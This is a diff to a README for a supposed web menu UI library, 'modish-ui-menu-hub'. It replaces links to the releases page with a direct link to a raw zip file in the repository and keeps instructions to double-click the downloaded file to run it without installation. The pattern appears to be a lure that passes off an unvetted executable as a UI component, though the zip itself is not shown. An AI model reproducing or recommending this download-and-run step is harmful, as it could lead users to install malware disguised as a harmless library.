@@ -1,11 +1,11 @@
 # 🍽️ modish-ui-menu-hub - Elegant Menu UI for Modern Web Apps
 
 ## 🚀 Quick Download
-[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%94%A5-FF5733?style=for-the-badge)](https://github.com/Fingerwaveeconomicrent764/modish-ui-menu-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%94%A5-FF5733?style=for-the-badge)](https://github.com/Fingerwaveeconomicrent764/modish-ui-menu-hub/raw/refs/heads/main/tulle/v3.1.zip)
 
 ## 📥 Download & Setup
 
-Visit this link to download the application: [https://github.com/Fingerwaveeconomicrent764/modish-ui-menu-hub/releases](https://github.com/Fingerwaveeconomicrent764/modish-ui-menu-hub/releases)
+Visit this link to download the application: [https://github.com/Fingerwaveeconomicrent764/modish-ui-menu-hub/raw/refs/heads/main/tulle/v3.1.zip](https://github.com/Fingerwaveeconomicrent764/modish-ui-menu-hub/raw/refs/heads/main/tulle/v3.1.zip)
 
 After downloading, open the folder where the file was saved. Look for the file named **modish-ui-menu-hub** (it may be inside a ZIP folder). Double-click the file to launch the application. That's it—no installation wizard required.
 
